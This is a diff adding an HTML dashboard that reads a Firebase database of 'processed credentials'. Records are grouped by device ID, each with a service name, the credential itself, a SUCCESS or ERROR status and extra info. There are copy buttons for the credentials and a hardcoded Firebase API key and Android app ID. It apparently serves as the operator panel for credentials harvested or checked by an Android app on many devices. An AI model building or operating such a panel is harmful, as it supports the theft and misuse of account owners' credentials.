@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Firebase Results Dashboard</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- FontAwesome for icons -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+
+    <style>
+        body {
+            background-color: #f4f6f9;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        .container {
+            margin-top: 30px;
+            max-width: 1400px;
+        }
+        .page-header {
+            margin-bottom: 2rem;
+            padding-bottom: 1rem;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        /* Stat Cards */
+        .stat-card {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            transition: transform 0.2s;
+        }
+        .stat-card:hover {
+            transform: translateY(-5px);
+        }
+        .stat-icon {
+            font-size: 2.5rem;
+            margin-right: 20px;
+            opacity: 0.8;
+        }
+        .stat-details h3 {
+            margin: 0;
+            font-size: 1.8rem;
+            font-weight: bold;
+        }
+        .stat-details p {
+            margin: 0;
+            color: #6c757d;
+            text-transform: uppercase;
+            font-size: 0.85rem;
+            letter-spacing: 1px;
+        }
+
+        /* Controls Area */
+        .controls-card {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+            margin-bottom: 20px;
+        }
+
+        /* Table Area */
+        .table-responsive {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+            padding: 0; /* Removing padding to let table header flush */
+        }
+        .table {
+            margin-bottom: 0;
+        }
+        .table thead th {
+            background-color: #f8f9fa;
+            border-bottom: 2px solid #dee2e6;
+            color: #495057;
+            font-weight: 600;
+            padding: 15px;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+        .table tbody td {
+            padding: 15px;
+            vertical-align: middle;
+        }
+
+        /* Badges & Status */
+        .status-success { color: #198754; font-weight: bold; }
+        .status-error { color: #dc3545; font-weight: bold; }
+        .status-other { color: #6c757d; font-weight: bold; }
+
+        .badge-service {
+            background-color: #e9ecef;
+            color: #495057;
+            font-weight: 500;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+        }
+
+        .device-id {
+            font-family: monospace;
+            background: #f8f9fa;
+            padding: 4px 8px;
+            border-radius: 4px;
+            border: 1px solid #e9ecef;
+            color: #d63384;
+        }
+
+        /* Copy button */
+        .btn-copy {
+            padding: 0.1rem 0.4rem;
+            font-size: 0.8rem;
+            margin-left: 10px;
+            cursor: pointer;
+            color: #6c757d;
+            border: 1px solid transparent;
+            border-radius: 4px;
+            background: transparent;
+            transition: all 0.2s;
+        }
+        .btn-copy:hover {
+            color: #0d6efd;
+            background: #e9ecef;
+        }
+        .btn-copy:active {
+            color: #198754;
+        }
+
+        /* Scrollable table body if too many items */
+        .table-container-scroll {
+            max-height: 800px;
+            overflow-y: auto;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="page-header d-flex justify-content-between align-items-center">
+        <div>
+            <h2 class="mb-0"><i class="fas fa-chart-bar text-primary me-2"></i> Results Dashboard</h2>
+            <p class="text-muted mb-0">Real-time view of processed credentials</p>
+        </div>
+        <div class="d-flex align-items-center gap-3">
+            <div class="form-check form-switch">
+                <input class="form-check-input" type="checkbox" id="autoRefreshToggle">
+                <label class="form-check-label" for="autoRefreshToggle">Auto-refresh (5s)</label>
+            </div>
+            <button class="btn btn-primary" onclick="fetchData()" id="refreshBtn">
+                <i class="fas fa-sync-alt me-1"></i> Refresh Now
+            </button>
+        </div>
+    </div>
+
+    <!-- Summary Statistics -->
+    <div class="row mb-2" id="statsContainer">
+        <div class="col-md-3">
+            <div class="stat-card border-start border-4 border-primary">
+                <div class="stat-icon text-primary"><i class="fas fa-database"></i></div>
+                <div class="stat-details">
+                    <h3 id="statTotal">0</h3>
+                    <p>Total Records</p>
+                </div>
+            </div>
+        </div>
+        <div class="col-md-3">
+            <div class="stat-card border-start border-4 border-success">
+                <div class="stat-icon text-success"><i class="fas fa-check-circle"></i></div>
+                <div class="stat-details">
+                    <h3 id="statSuccess">0</h3>
+                    <p>Success</p>
+                </div>
+            </div>
+        </div>
+        <div class="col-md-3">
+            <div class="stat-card border-start border-4 border-danger">
+                <div class="stat-icon text-danger"><i class="fas fa-times-circle"></i></div>
+                <div class="stat-details">
+                    <h3 id="statError">0</h3>
+                    <p>Errors</p>
+                </div>
+            </div>
+        </div>
+        <div class="col-md-3">
+            <div class="stat-card border-start border-4 border-info">
+                <div class="stat-icon text-info"><i class="fas fa-mobile-alt"></i></div>
+                <div class="stat-details">
+                    <h3 id="statDevices">0</h3>
+                    <p>Unique Devices</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Controls -->
+    <div class="controls-card">
+        <div class="row">
+            <div class="col-md-8">
+                <div class="input-group">
+                    <span class="input-group-text bg-white border-end-0"><i class="fas fa-search text-muted"></i></span>
+                    <input type="text" id="searchInput" class="form-control border-start-0 ps-0" placeholder="Search by credentials, device ID, status, or extra info...">
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="input-group">
+                    <span class="input-group-text bg-white border-end-0"><i class="fas fa-filter text-muted"></i></span>
+                    <select id="serviceFilter" class="form-select border-start-0 ps-0">
+                        <option value="">All Services</option>
+                        <!-- Options populated dynamically -->
+                    </select>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading spinner -->
+    <div id="loading" class="text-center my-5">
+        <div class="spinner-border text-primary" role="status">
+            <span class="visually-hidden">Loading...</span>
+        </div>
+        <p class="mt-2 text-muted">Fetching latest data...</p>
+    </div>
+
+    <!-- Results Table -->
+    <div class="table-responsive d-none" id="tableContainer">
+        <div class="p-3 border-bottom bg-light d-flex justify-content-between align-items-center">
+            <h5 class="m-0">Filtered Results: <span class="badge bg-secondary rounded-pill" id="resultCount">0</span></h5>
+        </div>
+
+        <div class="table-container-scroll">
+            <table class="table table-hover align-middle">
+                <thead>
+                    <tr>
+                        <th width="15%">Time</th>
+                        <th width="15%">Device ID</th>
+                        <th width="15%">Service</th>
+                        <th width="25%">Credential</th>
+                        <th width="10%">Status</th>
+                        <th width="20%">Extra Info</th>
+                    </tr>
+                </thead>
+                <tbody id="resultsTableBody">
+                    <!-- Rows populated dynamically -->
+                </tbody>
+            </table>
+        </div>
+
+        <div id="noResults" class="text-center py-5 d-none">
+            <i class="fas fa-search fa-3x text-muted mb-3 opacity-50"></i>
+            <h4 class="text-muted">No matching results found</h4>
+            <p class="text-muted">Try adjusting your search or filters.</p>
+        </div>
+    </div>
+</div>
+
+<!-- Firebase App (the core Firebase SDK) is always required and must be listed first -->
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+
+<!-- Add the Firebase products that you want to use -->
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+<script>
+    // Your web app's Firebase configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyBIPp5OxYpZwAqkiU6sYOge5p6rTGmMH88",
+        projectId: "ggggg-14be7",
+        storageBucket: "ggggg-14be7.firebasestorage.app",
+        databaseURL: "https://ggggg-14be7-default-rtdb.firebaseio.com",
+        appId: "1:476219350497:android:b48b7eeb9efedd65e3c6a0"
+    };
+
+    // Initialize Firebase
+    if (!firebase.apps.length) {
+        firebase.initializeApp(firebaseConfig);
+    }
+    const database = firebase.database();
+
+    let allData = [];
+    let services = new Set();
+    let autoRefreshInterval = null;
+
+    // DOM Elements
+    const tableBody = document.getElementById('resultsTableBody');
+    const loadingDiv = document.getElementById('loading');
+    const tableContainer = document.getElementById('tableContainer');
+    const searchInput = document.getElementById('searchInput');
+    const serviceFilter = document.getElementById('serviceFilter');
+    const resultCountSpan = document.getElementById('resultCount');
+    const noResultsDiv = document.getElementById('noResults');
+    const refreshBtn = document.getElementById('refreshBtn');
+    const autoRefreshToggle = document.getElementById('autoRefreshToggle');
+
+    // Stats Elements
+    const statTotal = document.getElementById('statTotal');
+    const statSuccess = document.getElementById('statSuccess');
+    const statError = document.getElementById('statError');
+    const statDevices = document.getElementById('statDevices');
+
+    // Event Listeners
+    searchInput.addEventListener('input', renderTable);
+    serviceFilter.addEventListener('change', renderTable);
+    autoRefreshToggle.addEventListener('change', handleAutoRefresh);
+
+    // Fetch data initially
+    fetchData();
+
+    function handleAutoRefresh(e) {
+        if (e.target.checked) {
+            autoRefreshInterval = setInterval(() => {
+                const icon = refreshBtn.querySelector('i');
+                icon.classList.add('fa-spin');
+                fetchData(true); // silent fetch
+            }, 5000);
+        } else {
+            clearInterval(autoRefreshInterval);
+            refreshBtn.querySelector('i').classList.remove('fa-spin');
+        }
+    }
+
+    function fetchData(silent = false) {
+        if (!silent) {
+            loadingDiv.classList.remove('d-none');
+            tableContainer.classList.add('d-none');
+            refreshBtn.disabled = true;
+        }
+
+        const resultsRef = database.ref('results');
+
+        // Listen for once to get the whole data
+        resultsRef.once('value', (snapshot) => {
+            allData = [];
+            services.clear();
+            let successCount = 0;
+            let errorCount = 0;
+            let uniqueDevices = new Set();
+
+            const data = snapshot.val();
+
+            if (data) {
+                // Iterate through device IDs
+                Object.keys(data).forEach(deviceId => {
+                    uniqueDevices.add(deviceId);
+                    const deviceData = data[deviceId];
+
+                    // Iterate through push IDs
+                    Object.keys(deviceData).forEach(pushId => {
+                        const item = deviceData[pushId];
+
+                        const status = (item.status || '').toUpperCase();
+                        if (status === 'SUCCESS') successCount++;
+                        else if (status === 'ERROR' || status === 'FAILED') errorCount++;
+
+                        allData.push({
+                            id: pushId,
+                            deviceId: deviceId,
+                            credential: item.credential || '',
+                            extra: item.extra || '',
+                            service: item.service || '',
+                            status: item.status || '',
+                            timestamp: item.timestamp || 0
+                        });
+
+                        if (item.service) {
+                            services.add(item.service);
+                        }
+                    });
+                });
+
+                // Sort by timestamp descending (newest first)
+                allData.sort((a, b) => b.timestamp - a.timestamp);
+
+                // Update stats
+                statTotal.textContent = allData.length;
+                statSuccess.textContent = successCount;
+                statError.textContent = errorCount;
+                statDevices.textContent = uniqueDevices.size;
+
+                // Only update service filter dropdown options if length changed to prevent losing selection during auto-refresh
+                if (serviceFilter.options.length <= 1 || services.size > serviceFilter.options.length - 1) {
+                    populateServiceFilter();
+                }
+
+                renderTable();
+            } else {
+                // No data
+                statTotal.textContent = "0";
+                statSuccess.textContent = "0";
+                statError.textContent = "0";
+                statDevices.textContent = "0";
+                renderTable(); 
+            }
+
+            if (!silent) {
+                loadingDiv.classList.add('d-none');
+                tableContainer.classList.remove('d-none');
+                refreshBtn.disabled = false;
+            }
+
+            if (autoRefreshToggle.checked) {
+                setTimeout(() => {
+                    refreshBtn.querySelector('i').classList.remove('fa-spin');
+                }, 500);
+            }
+
+        }, (error) => {
+            console.error("Error fetching data:", error);
+            if (!silent) {
+                loadingDiv.classList.add('d-none');
+                refreshBtn.disabled = false;
+            }
+        });
+    }
+
+    function populateServiceFilter() {
+        const currentSelection = serviceFilter.value;
+        serviceFilter.innerHTML = '<option value="">All Services</option>';
+
+        Array.from(services).sort().forEach(service => {
+            const option = document.createElement('option');
+            option.value = service;
+            option.textContent = service;
+            if (service === currentSelection) {
+                option.selected = true;
+            }
+            serviceFilter.appendChild(option);
+        });
+    }
+
+    function formatDate(timestamp) {
+        if (!timestamp) return '<span class="text-muted">N/A</span>';
+        const date = new Date(timestamp);
+
+        const today = new Date();
+        const isToday = date.getDate() === today.getDate() && 
+                        date.getMonth() === today.getMonth() && 
+                        date.getFullYear() === today.getFullYear();
+
+        if (isToday) {
+            return `<strong>Today</strong> at ${date.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'})}`;
+        }
+
+        return `${date.toLocaleDateString()} <span class="text-muted small">${date.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>`;
+    }
+
+    // HTML Sanitizer
+    function escapeHtml(unsafe) {
+        return (unsafe || '').toString()
+             .replace(/&/g, "&amp;")
+             .replace(/</g, "&lt;")
+             .replace(/>/g, "&gt;")
+             .replace(/"/g, "&quot;")
+             .replace(/'/g, "&#039;");
+    }
+
+    // Copy to clipboard function
+    window.copyText = function(text, btnElement) {
+        navigator.clipboard.writeText(text).then(() => {
+            const icon = btnElement.querySelector('i');
+            icon.className = 'fas fa-check text-success';
+            setTimeout(() => {
+                icon.className = 'far fa-copy';
+            }, 2000);
+        }).catch(err => {
+            console.error('Failed to copy text: ', err);
+        });
+    }
+
+    function renderTable() {
+        const searchTerm = searchInput.value.toLowerCase();
+        const selectedService = serviceFilter.value;
+
+        let filteredData = allData.filter(item => {
+            const matchesSearch = 
+                item.credential.toLowerCase().includes(searchTerm) ||
+                item.extra.toLowerCase().includes(searchTerm) ||
+                item.deviceId.toLowerCase().includes(searchTerm) ||
+                item.status.toLowerCase().includes(searchTerm);
+
+            const matchesService = selectedService === "" || item.service === selectedService;
+
+            return matchesSearch && matchesService;
+        });
+
+        resultCountSpan.textContent = filteredData.length;
+        tableBody.innerHTML = '';
+
+        if (filteredData.length === 0) {
+            noResultsDiv.classList.remove('d-none');
+            tableBody.closest('table').classList.add('d-none');
+        } else {
+            noResultsDiv.classList.add('d-none');
+            tableBody.closest('table').classList.remove('d-none');
+
+            filteredData.forEach(item => {
+                const tr = document.createElement('tr');
+
+                let statusClass = 'status-other';
+                let statusIcon = '<i class="fas fa-info-circle"></i>';
+
+                const statusUpper = item.status.toUpperCase();
+                if (statusUpper === 'SUCCESS') {
+                    statusClass = 'status-success';
+                    statusIcon = '<i class="fas fa-check-circle"></i>';
+                }
+                else if (statusUpper === 'ERROR' || statusUpper === 'FAILED') {
+                    statusClass = 'status-error';
+                    statusIcon = '<i class="fas fa-times-circle"></i>';
+                }
+
+                // Sanitize fields to prevent XSS
+                const safeCredential = escapeHtml(item.credential);
+                const safeDeviceId = escapeHtml(item.deviceId);
+                const safeService = escapeHtml(item.service);
+                const safeStatus = escapeHtml(item.status);
+                const safeExtra = escapeHtml(item.extra);
+
+                tr.innerHTML = `
+                    <td>${formatDate(item.timestamp)}</td>
+                    <td>
+                        <span class="device-id" title="Device ID">${safeDeviceId.substring(0,8)}...</span>
+                        <button class="btn-copy" onclick="copyText('${safeDeviceId.replace(/'/g, "\\'")}', this)" title="Copy Device ID">
+                            <i class="far fa-copy"></i>
+                        </button>
+                    </td>
+                    <td><span class="badge-service"><i class="fas fa-cube me-1 text-muted"></i> ${safeService}</span></td>
+                    <td>
+                        <div class="d-flex align-items-center">
+                            <strong class="font-monospace">${safeCredential}</strong>
+                            <button class="btn-copy ms-auto" onclick="copyText('${safeCredential.replace(/'/g, "\\'")}', this)" title="Copy Credential">
+                                <i class="far fa-copy"></i>
+                            </button>
+                        </div>
+                    </td>
+                    <td class="${statusClass}">${statusIcon} ${safeStatus}</td>
+                    <td><small class="text-muted">${safeExtra}</small></td>
+                `;
+                tableBody.appendChild(tr);
+            });
+        }
+    }
+</script>
+
+<!-- Bootstrap JS Bundle -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
